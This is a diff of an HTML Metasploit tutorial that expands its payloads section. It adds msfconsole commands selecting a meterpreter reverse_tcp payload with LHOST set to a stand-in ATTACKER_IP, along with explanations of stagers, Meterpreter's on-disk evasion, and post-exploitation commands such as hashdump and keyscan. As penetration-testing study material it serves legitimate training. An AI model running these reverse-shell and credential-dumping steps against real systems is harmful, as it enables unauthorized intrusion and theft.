@@ -83,8 +83,9 @@ msf6 exploit(...) &gt; setg LHOST ATTACKER_IP</code></pre>
               <div class="msf-walk-card">
                 <p>show payloads, then set one that fits your listener and the target&#39;s architecture.</p>
                 <pre class="msf-cmd"><code>msf6 exploit(...) &gt; show payloads
-msf6 exploit(...) &gt; set payload &lt;index no.&gt;
-msf6 exploit(...) &gt; set LPORT 443</code></pre>
+msf6 exploit(...) &gt; grep meterpreter grep reverse_tcp show payloads
+msf6 exploit(...) &gt; set payload 15
+msf6 exploit(...) &gt; set LHOST ATTACKER_IP</code></pre>
               </div>
             </li>
             <li class="msf-walk-step" data-step="5" data-node="msf-targets">
@@ -354,33 +355,40 @@ msf6 exploit(...) &gt; setg LHOST ATTACKER_IP</code></pre></div>
                 <li class="msf-node is-step has-kids" id="node-msf-payloads" data-step="4">
                   <details class="msf-node-box">
                     <summary><span class="msf-step-badge" aria-label="Workflow step 4">4</span><span class="msf-node-label">Payloads (show payloads)</span></summary>
-                    <div class="msf-node-body"><p>What runs on the target once the exploit lands. show payloads lists only the ones that fit this module. The payload must match your listener and the target&#39;s architecture.</p><pre class="msf-cmd"><code>msf6 exploit(...) &gt; show payloads
-msf6 exploit(...) &gt; set payload &lt;index no.&gt;
-msf6 exploit(...) &gt; set LPORT 443</code></pre></div>
+                    <div class="msf-node-body"><p>The code sent with the exploit that runs on the target, usually to return a shell: the exploit&#39;s job is to land it, the payload&#39;s job is to connect back. Run from inside an exploit module, show payloads lists only the ones that fit (msfconsole has already filtered to the target OS and arch), and set payload &lt;no.&gt; selects one, which adds its own options (LHOST, LPORT). The list is long, so filter with grep; ifconfig prints your LHOST without leaving the console.</p><pre class="msf-cmd"><code>msf6 exploit(...) &gt; show payloads
+msf6 exploit(...) &gt; grep meterpreter grep reverse_tcp show payloads
+msf6 exploit(...) &gt; set payload 15
+msf6 exploit(...) &gt; set LHOST ATTACKER_IP</code></pre></div>
                   </details>
                   <ul class="msf-tree">
+                  <li class="msf-node" id="node-pl-staging">
+                    <details class="msf-node-box">
+                      <summary><span class="msf-node-label">Singles, stagers, stages</span></summary>
+                      <div class="msf-node-body"><p>Three payload builds. A single carries the exploit and the whole task in one; self-contained and stable, but large, and some exploits cannot fit it. A staged payload splits the work: a small, reliable stager (Stage0) runs first and opens the connection back (reverse_tcp, reverse_https, bind_tcp), then pulls a larger stage (Stage1) with no size limit, like Meterpreter or VNC. A / in the payload name marks a staged pair: windows/shell_bind_tcp is a single, windows/shell/bind_tcp is stager + stage. Metasploit picks the stager for you.</p></div>
+                    </details>
+                  </li>
                   <li class="msf-node" id="node-pl-meterpreter">
                     <details class="msf-node-box">
                       <summary><span class="msf-node-label">Meterpreter</span></summary>
-                      <div class="msf-node-body"><p>Metasploit&#39;s in-memory agent, with built-in commands for files, processes, credentials and pivoting.</p></div>
+                      <div class="msf-node-body"><p>The multi-purpose stage. Injected as a DLL and run entirely in memory, leaving nothing on disk, so it is hard to spot with ordinary forensics; extensions load and unload on the fly. Its own prompt takes Linux-style commands, not Windows ones: getuid, not whoami. From it: hashdump, screenshot, keyscan, getsystem, migrate, and shell to drop into a real cmd.exe on the host.</p></div>
                     </details>
                   </li>
                   <li class="msf-node" id="node-pl-bind">
                     <details class="msf-node-box">
                       <summary><span class="msf-node-label">Shell binds</span></summary>
-                      <div class="msf-node-body"><p>The target opens a listening port and you connect to it. Needs that port reachable from you.</p></div>
+                      <div class="msf-node-body"><p>The target opens a listening port and you connect in. Needs that port reachable from you, so it fails behind inbound filtering; reverse shells are usually preferred.</p></div>
                     </details>
                   </li>
                   <li class="msf-node" id="node-pl-reverse">
                     <details class="msf-node-box">
                       <summary><span class="msf-node-label">Reverse shells</span></summary>
-                      <div class="msf-node-body"><p>The target connects back to your listener (LHOST/LPORT). Works through most NAT and inbound filtering.</p></div>
+                      <div class="msf-node-body"><p>The target dials back to your listener (LHOST/LPORT). It rides outbound traffic, which firewalls trust more than inbound, so it works through most NAT and filtering. Still watched, so tread carefully.</p></div>
                     </details>
                   </li>
                   <li class="msf-node" id="node-pl-exe">
                     <details class="msf-node-box">
                       <summary><span class="msf-node-label">EXE</span></summary>
-                      <div class="msf-node-body"><p>A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler.</p></div>
+                      <div class="msf-node-body"><p>A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler. Beyond Metasploit&#39;s own payloads, frameworks like Empire and Cobalt Strike cover the same ground on real engagements.</p></div>
                     </details>
                   </li></ul>
                 </li>
